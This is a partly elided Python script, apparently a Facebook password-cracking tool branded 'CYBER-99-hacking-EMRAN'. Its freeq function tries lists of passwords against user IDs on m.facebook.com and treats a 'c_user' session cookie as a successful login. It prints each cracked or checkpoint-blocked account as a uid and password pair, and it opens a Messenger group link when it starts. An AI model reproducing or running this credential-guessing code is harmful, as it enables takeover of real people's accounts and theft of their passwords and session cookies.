#created by Handsome
#tottaly written by Mr Handsome
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-CYBER-99-hacking-EMRAN/1.2.0 OPN-B'
...
"""
clear()
os.system("xdg-open https://m.me/j/AbalmMizcBPMxUIm/")
xxxx = str(len(ugen))
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'method': 'GET',
            'path':'https://m.facebook.com/?_rdc=1&_rdr',
            'scheme': 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[CYBER-99-hacking-EMRAN😻-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mCYBER-99-hacking-EMRAN😿-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HANDSOME] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
